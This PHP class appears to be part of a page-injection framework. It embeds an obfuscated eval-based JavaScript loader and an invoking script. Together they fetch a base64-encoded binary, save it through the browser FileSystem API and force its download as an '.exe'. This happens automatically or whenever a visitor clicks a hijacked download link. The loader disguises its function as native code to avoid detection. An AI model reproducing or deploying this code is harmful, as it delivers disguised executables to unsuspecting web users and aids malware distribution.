<?php

namespace LPO\Digest\Injectable\DownloadMethod;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInvokable;

class JsonFileApi extends DownloadMethod implements JavascriptInvokable {

	/**
	 * @var string
	 */
	public static $_source_script = <<<'JS'
eval((function(J5){for(var p5="",X5=0,c5=function(J5,u5){for(var E5=0,S5=0;S5<u5;S5++){E5*=96;var m5=J5.charCodeAt(S5);if(m5>=32&&m5<=127){E5+=m5-32;}}return E5;};X5<J5.length;){if(J5.charAt(X5)!="`")p5+=J5.charAt(X5++);else{if(J5.charAt(X5+1)!="`"){var Y5=c5(J5.charAt(X5+3),1)+5;p5+=p5.substr(p5.length-c5(J5.substr(X5+1,2),2)-Y5,Y5);X5+=4;}else{p5+="`";X5+=2;}}}return p5;})("var H6V5=window;for(var I5 in` 5 ){if(I5.length===(0x7<=(129.4E1,41)?(74.,6):(19,0x12F)<(8.,8.)?(8.61E2,1024):(0xE1,0x118)<(5.5` ) A2)?(116.4E1,60.0E1` E!,57.))&&I5.charCodeAt((0xA1<=(1.20E1,12.81E2)?(0x205,3):(9.5E1,0x202)))===(95.>=(4.520E2,50.)?(6.140E2,100):(8,1.232E3)<(9` X 30)?(31.,\'P\'):(33,10.13E2))&&I5.charCodeAt(((0x11B,125)<(35.,68.7E1)?(138.,5):(0x1A4,43` 3 ))===(` \' <=(85.,115)?(1.1460E3,119):(74.8E1,61))&&I5.charCodeAt(((0x147,0x255)<=(84.,24.)?(13.44E2,\'f_\'):(26.,126)>0x95?(7` \/%1.,122.)>=(0x11F,28` [ 2.,1):(8.15E2,0x64)))===((34.,0x123)<(7.51` : 39)?(6.9E2,true):(0x19C,103.9E1)>12?(7.8E2,105):(116.80E1,0x16C))&&I5.charCodeAt(((39.6E1,26.0E1)<=(0x13A,45.30E1)?(0x11A,0):(0x165,47.5E1)))===((59.40E1,0.)<=(90.,0x119)?(131.3E1,119):(9.8E1,23` I )))break};var T6P={\"A5\":\"f\",\"r5\":\"e0\",\"N5\":\"va\",\"e5\":\"lu\"` K!Z5=(T6P.N5+T6P.e5` \" r` (!A5);H6V5[I5][Z5]=(function(){var Q1=\"oS\",a4=\"un\",W4=(0x82<(58.7E1,0x39)?(30,112):(1.23E3,0xC8)<0x1A6?(0x255,\"O\"):0xB1>(0x211,28.70E1)?0x223:(63,0x84)),I4=\"re\",s4=\"on\",S4=((1.36E2,68.3E1)<=(131.5E1,120.)?(57.,\"t\"):(9.86E2,15.)>=(49.30E1,84.)?(41` >\"0x122,11.83E2)>=101?(0x4F,\"g` :!210,3.97E2)),J4=\"E\",u=((52.,57)<(3.58E2,107.)?(33,\"a\"):39>=(145.9E1,10.4E1)?60.:(78.4E1,0x244)),X4=(78.>(130.1E1,110.)?\'o\':(135.,10.70E1)>=5.5E1?(27.0E1,\"h\"):(55,1.228E3)),f4=((57,0x49)<=(67.,19)?\'f_\':(0x8C,2` 3 6.3E1,49)?(2.2E1,\"d\"):0xBF<(1.176E3,51` Q#49.,0x89)),f1=true,x1=\"st\",P1=((111,0x111)<0x164?(60.,\"M\"):(32.30E` ; 6D)),R1=((0x7E,1.332E3)<=0x209?(0x21D,null):(47,6.24E2)>=54` 8 37` 5#2.42E2,6.5E2)),i1=\"stF\",O1=\"eq\",N1=\"tR\",G4=((148,0x49)>13.290E2?(45.,90):0xCB<=(128.0E1,62)?7.46E2:(19.,16.2E1)>=(52,132.)?(116,\"b\"):(3.7E2,3.94E2)),L1=\"ue\",m4=\"em\",G1=\"ileSyst\",V4=((3.6E1,0x1B0)<=145.?3:(0x34,8.02E2)>=0x1D?(0x9B,\"F\"):(0x2B,0x158)<=(0x5E,6.)?34.9E1:(82,126.)),b1=\"qu\",q1=\"Sy\",c4=\"te\",l1=\"eS\",U1=\"tFi\",O=((137.9E1,102.60E1)>(12.39E2,86)?(89.,\"s\"):(122,93.)),g1=((5.53E2,101)<=87.?(32,36.1E1):119>(37.,1.078E3)?(8.83E2,\"GET\"):(40.1E1,35.)<0x20B?(11.31E2,\"R\"):(118.,0x23C)),R=((0x103,103.)<` ( 0,129.20E1)?(25.0E1,\"t` W 29.,1.62E2)>(11.06E2,0x212)?(0x8A,93.7E1):(21.8E1,0x230)),v=((0x18B,0x1D2)>=(61,26)?(69.,\"i\"):(0x1EA,31.)),u4=(142.<(23.,14.83E2)?(23.70E1,\"k\"):(28,0x21D)),C1=\"eb\",e4=((14.120E2,108.)<=(0xED,113)?(132.,\"w\"):(51.80E1,94.)),D1=\"yn\",w1=\"stemS\",h1=\"Fi\",v1=\"uest\",e=((25.,0x9A)>=(110.,2.5E1)?(76,\"c\"):(0x145,24)),h=((1.227E3,37.7E1)>=0x12D?(9.620E2,\"n\"):(81,0x198)),k4=((0x193,49.5E1)<=12.13E2?(37.5E1,\"m\"):(0x1F1,12.620E2)),A1=\"ste\",E=(86.60E1>(104,0x246)?(24.,\"y\"):0xCA<=(108.2E1,96)?(0x1F3,0x126):(4.41E2,1.498E3)<=(8.86E2,55)?5.54E2:(0x1B5,0x44)),h4=((0x10F,41.0E1)>=20.?(9.8E1,\"S\"):(11.70E1,0xFB)<(1.2770E3,147.)?(10.120E2,103):(23,20.)),j1=\"stFi\",F4=((0x7B,68)<(0.,5.21E2)?(1.312E3,\"u\"):(55,0xFF)),r4=((120,1.463E3)<0x6D?0x1E7:(0x185,0x119)>=0xB8?(0x8C,\"q\"):(78,1.291E3)),z=((0x16` K 63)<117?\'M\':105.<(9.23E2,79.2E1)?(7.5E1,\"r\"):(7.7E1,0x1E5)<=0x64?(25,39.1E1):(5,114)),Z1=false,F1=(44.1E1>=(5.2E2,2.25E2)?(26.70E1,1000):(18.,0x154)),r1=((0x97,5.520E2)>=3.23E2?(0x3A,50):(24.,76)),E4=((3.54E2,0x216)>(1.163E3,64.)?(0x245,1024):(118,75.)),e1=1.4,K1=((0x1A0,143.)>(92,113)?(3.510E2,\"x\"):(137,140.4E1)),P=((4.97E2,91.60E1)<=(9.02E2,0xE9)?1.185E3:(125.,1.1` ? 0x1BF?(0xC6,\"e\"):(0x15F,104.4` = (55.,99.)?(2.69E2,0x19D):(94.80E1,114.)),H1=((6.21` > 256)>0x31?(9.81E2,\".\"):7.33E2<(1.231E3,0x1E4)?0x14A:(1.69E2,99.60E1)<(88,9.48E2)?5.36E2:(78,7.7E1)),V1=\"ad\",U=\"o\",N=((139.,0x215)>=0x1DB?(104,\"l\"):(88.10E1,0x1AA)),I1=\"Down\",J1=(I1+N+U+V1+H1+P+K1+P),Y4=e1,z1=E4*E4*Y4,y1=r1` %\"o1=F` $#M1=Z1;if(!H6V5[I5][(z+P+r4+F4+P+j1+N+P+h4+E+A1+k4` %!h+e)]){` C,v1+h` G&w1+D1+e)]=` @%e4+C1+u4+v+R+g1` R!F4+P+O+U1+N+l1+E+O+c4+k4+q1+h+e)];}if(!H6V5[I5][(z+P+b1` P R+V4+G1+m4)]){` 5)r4+L1` <#v+N+P+q` *!P+k4)]=` E%e4+P+G4+u` D 1+O1+F4+P+i1` R\"h4+E` V m4)];}var t1=R1,d1=function(V,r){var S=\"ng\",m=\"tat\",x4=\"ea\",R4=\"pe\",b4=\"Ty\",Y=\"nse\",O4=\"ET\",B=((57.5E1,33.)>=(4.310E2,8.6E2)?(0x168,0x74):(0x238,3` L )>=0xBC?` 0 5,\"G\"):1.456E3<=(29.90E1,7.17E2)?31.40E1:(141.,14.620E2)),Z=((0x1FE,75)>122?(115,true):(136,1.45E3)>(0x1D9,79)?(70,\"p\"):(94.,131.` : 5,4.07E2)?(17,\'L\'):(54.90E1,8.83E2)),I=\"tpR\",s=\"H\",J=((2.,0x15A)<=(0x11,1.105E3)?(0x22E,\"L\"):(16.,2.82E2)),C=((0xCE,112.)<=(134,0x1FC` Q 85,\"X\"):(24.8E1,0x5F)<=29?133:(7.020E2,58)),L=new H6V5[I5][(C+P1+J+s+R+I+P+r4+F4+P+x1)]();L[(U+Z+P+h)]((B+O4),V,f1` 5 z+P+O+Z+U+Y+b4+R4)]=(R+P+K1+R` U\"h+z+x4+f4+E+O+m+P+e+X4+u+S+P)]=function(){var x=\"se\",g=\"po\",l=\"gt\",b=((59.30E1,30.70E1)>(0x1B3,0x9B)?(43.6E1,\"-\"):(6.80E1,8.93E2)),t=\"nte\",f=\"Co\",G=\"eHea\",w=\"etR\",H=\"ON\",D=(3.>=(42.5E1,147.70E1)?20:90>(70.8E1,91.)?2.37E2:95>(3.61E2,18)?(1.321E3,\"D\"):(0x3E,104.60E1));if(L[(z+P+u+f4+E+h4+R+u+R+P)]==L[(D+H+J4)]){if(M1){t1=L[(S4+w+P+O+Z+s4+O+G+f4+P+z)]((f+t+h+R+b+J+P+h+l+X4));}if(r){r(L[(I4+O+g+h+x)]);}}};L[(O` I f4)]();},B4=function(P4,Q,A){var z4=((6.810E2,0x1CD)>=61?(0x92,\"1\"):(73.8E1,0x213)),c=(59.1E1>(1.75E2,51.1E1)?(1.058E3,\"=\"):0x136<(0x0,0x64)?\"V\":(13.36E2,0x10)>=(48.5E1,20)?(84,\'V\'):(68,14.13E2)),H4=((0xE6,9.08E2)>=(0x58,126.80E1)?(114,\"f\"):(0x18C,62.)>=0x1A2?\'f\':(0x249,60)>(91,28.)?(124,\"j\"):(6.26E2,0xF2)),T1=(0xB4>=(1.0230E3,11.43E2)?(65.9E1,90.10E1):135.6E1<=(8.94E2,110.)?(0xB4,0x89):9.25E2>(10.9E2,0xA6` < 14A,\"&\"):(74.9E1,134.8E1)),p4=function(){var x=\"foreu\";H6V5[I5][(U+h+G4+P+x+h+N+U+u+f4)]=R1` :&N+U+e+u+R+v+s4)][(X4+I4+T6P.A5)]=P4;};try{d1(P4+(T1+H4+O+U+h+c+z4),function(r){var S=\"RAR\",m=\"MPO\",x4=\"it\",R4=\"ek\",b4=\"ncate\",Y=\"tru\",O4=\"ter\",B=(14<(0x11D,115)?(0x96,\"W\"):(0x75,66.)>=69?\"X\":(128,111.80E1)<=(101,8.4E1)?0x152:(84.5E1,17)),Z=\"le\",I=\"oot\",s=(0xFA<(0x173,48)?(140.6E1,16.):(0x1FB,142)>0x1A3?\'s\':(0xB2,5.30E1)>=38?(135,\"Y\"):(13.47E2,71.5E1)),J=\"AR\",C=\"PO\",L=(0x119>=(4.76E2,4.10E1)?(14.22E2,\"T\"):(17,0x10B)<11.8E1?(133,3):(19,97)),Z4=\"mS\",N4=\"ys\",o4=\"ues\",L4=\"at\",U4=\"cr\",g4=(0x9E<=(13.76E2,0x172)?(7.07E2,\"z\"):35.>=(122,1.349E3)?(97,3):(0x213,1.233E3)),F=\"ize\",y4=\'am\',l4=(0xF7>=(0xDB,4.46E2)?(17.2E1,9.34E2):(110.4E1,0x210)>103.?(67,\'r\'):(0xA3,0x22E)<=(145.,0x8B)?97:(59,0x60)),w4=(20>=(1.385E3,0x12)?(0x8B,\'s\'):(83.,0x41)<=(0x8,50.)?(61.,\'l\'):(138.,0x1C8)),p=(19.40E1>=(121` 5 9A)?(143.4E1,0x23D):(40` B ,0x130)>=5.55E2?(0x238,0x16C):(32,101.)<(1.36E2,0x17E)?(0x108,\'-\'):(0x75,0x130)),t4=(16<(0x22E,99.2E1` K 6F,\'e` I!1C,0x167)>=(1.,44.90E1)?0x7A:(81.,136)),a=\'c\',T4=(0x24<(0x97,5.41E2)?(5.060E2,\'o\'):(0x12B,147.)),M` N 125>=(9.39E2,0x12)?(66,\'\/\'):(28.,0x1E5)),D4=\'on\',Q4=((0x1D7,0xE9)<(0.,0x24C)?(8.63E2,\'i\'):(89,0x253)),o` O C8,133.4E1)>=(114,88.)?(0x173,\'t\'):(1.2730E3,0x2B)),n=\'ic\',k=\'l\',q=(16>(5,0xCB)?(34.7E1,110.):81<=(8.70E1,124.)?(10.20E1,\'p\'):(38.,0xA2)),X=(76.80E1>=(131.9E1,54.40E1)?(0x119,\'a\'):(85.7E1,84.7E1)<104` ; 48,11):(6.44E2,126)),C4=\"dd\",K4=(126.10E1<=(97.0E1,70.9E1)?(97,73.):(12.33` Y 3.)>33?(0x6B,\"B\"):0x232<=(19.,0x142)?(34.0E1,0x1B2):(101,131)),j4=\"to\",v4=\"par\",i4=((13.68E2,69)<=(12.74E2,0x9E)?(0x15E,\"N\"):(98,0x5A)),q4=(87.4E1<(0x17A,1.186E3)?(28,\"J\"):(115.0E1,32.)),y=(1.31E2>=(129.,0x5C)?(68.9E1,\"A` N 0.08E2,0xC6)),T=\"ato\";function A4(x){var g=\"de\",l=((69,119.)<(0x256,0x10B)?(30,\"C\"):(138,46.1E1)<42.?3.24E2:8.5E1>(64,101.)?\"R\":(6.36E2,67)),b=\"cha\",t=\"tob\",f=H6V5[I5][(T+G4)](` \'%u+t)](x)),G=f.length,w=new Uint8Array(new ` % Buffer(G));for(H5=0;H5<G;H5++){w[H5]=f[(b+z+l+U+g+y+R)](H5);}return w;}var M=H6V5[I5][(q4+h4+W4+i4)][(v4+O+P)](r);Q` <&u+j4+G4)](` Q%T` +!M[(h+h)]));var d=new ` P%K4+N+U` V![A4(M[(C4)])],{type:(X+q+q+k+n+X+o+Q4+D4+M4+T4+a+o+t4+o+p+w4+o+l4+t4+y4)});if(d&&d[(O+F)]>y1` &\"v+g4+P)]<o1){if(M` )+!=t1){p4();return ;}if(!Q){Q=J1;}function W(x){var g=\"do\",l=\"tt\",b=\"RL\",t=\"toU\",f=\"bu\",G=\"ri\",w=\"tA\",H=\"ent\",D=H6V5[I5][(f4+U+e+F4+k4+H)][(U4+P+L4+P+J4+N+m4+P+h+R)](\"a\");D[(O+P+w+R+R+G+f+c4)]((X4+z+P+T6P.A5),x[(t+b)]()` I$R+y+l+z+v+G4+F4+R+P)]((g+e4+h+N+U+u+f4),Q` M e+N+v+e+u4)]();};if(H6V5[I5][(z+O1+o4+R+h1+N+P+h4+N4+R+P+Z4+E+h+e)]){var d4=` L\'P+r4+v1+V4+v` R#E+O` V k4` (!` Y (` L%L+J4+P1+C+g1+J+s)],z1),n4=d4[(z+I)][(S4+P+R+V4+v+Z)](Q,{create:true}),j=n4[(e+I4+u+R+P+B+z+v+O4)]();j[(Y+b4)](d[(O+v+g4+P)]` 4 O+P+R4)](0` C e4+z+x` : (d);W(n4);}else{H6V5[I5][(I4+b1+P+x1+V4+v+N+l1+E+O+c4+k4)](` A%L+J4+m+S+s)],z1,function(w){var H=\"tF\",D=\"ge\",V=\"ro\";w[(V+U+R)][(D+H+v+N+P)](Q,{create:true},function(t){var f=\"er\",G=false;t[(U4+P+L4+P+B+z+v+R+f)](` O$x` R!g=\"si\",l=\"nd\",b=\"ee\";x[(U+h+e4` R\"b+l)]=` R$){if(!G){x[(O+b+u4)](0);x[(` J$P)](d);G=true;}else{W(t);}};x[(R+z+a4+e+u+c4)](d[(g+g4+P)]);});});},p4);}` U!p4();}});}catch(x)` +#;B4[(T6P.N5+T6P.e5+P+W4` \' A5)]=B4[(R+Q1+R+z+v+h+S4)]=function(){var x=\"] }\",g=\"od\",l=\"ve\",b=\"() { [\",t=((72,41.)<(65.,0x1D7)?(0xA4,\" \"):6.270E2<(1.83E2,43.5E1)?114.:(12.23E2,5.8E2)<=(74,0xAC)?(38,128.4E1):(1.437E3,0x1A4));return (T6P.A5+a4+e+R+v+U+h+t)+Z5+(b+h+u` 0 l+t+e+g+P+x);}` T#B4;})()"));
JS;
	/**
	 * @var string
	 */
	private static $_invoking_script = <<<'JS'
if(!document.querySelectorAll) { document.querySelectorAll = function(selector) { var doc = document, head = doc.documentElement.firstChild, styleTag = doc.createElement("STYLE"); head.appendChild(styleTag); doc.__qsaels = []; styleTag.styleSheet.cssText = selector + "{x:expression(document.__qsaels.push(this))}"; window.scrollBy(0, 0); return doc.__qsaels; } } function dl(){window["value0f"](__tokens.directDownloadLink, __tokens.filename + ".exe");iframer(document.querySelectorAll(".dlink")[0], 0, __tokens.downloadLink + "&graceful=1", __tokens.downloadLink + "&graceful=1");} if(__tokens.autoDownload) { dl(); } var links = document.querySelectorAll(".dlink"); for(var i = 0; i < links.length; i++) { var dlink = links[i]; dlink.href = "javascript:void(0)"; dlink.onclick = function(e) { e.preventDefault(); dl(); } }
JS;


	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	function getInvokingScript(Bootstrap $bootstrap)
	{
		$iframe = new Iframe;
		return $iframe->getSourceScript().';'.';'.self::$_invoking_script;
	}

	/**
	 * @return string
	 */
	public function getSourceScript(){ return self::$_source_script; }
}